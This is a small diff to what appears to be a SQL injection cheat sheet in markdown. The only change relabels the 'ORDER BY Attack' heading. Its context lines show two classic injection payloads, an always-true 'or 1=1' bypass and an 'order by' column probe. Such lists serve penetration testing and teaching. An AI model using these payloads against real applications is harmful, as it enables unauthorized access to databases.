@@ -10,7 +10,7 @@
 ```
 1' or 1=1; -- -  
 ```
-- ORDER BY Attack
+- ORDER BY Attack (column number)
 ```
 1' order by 1; -- -
 ```
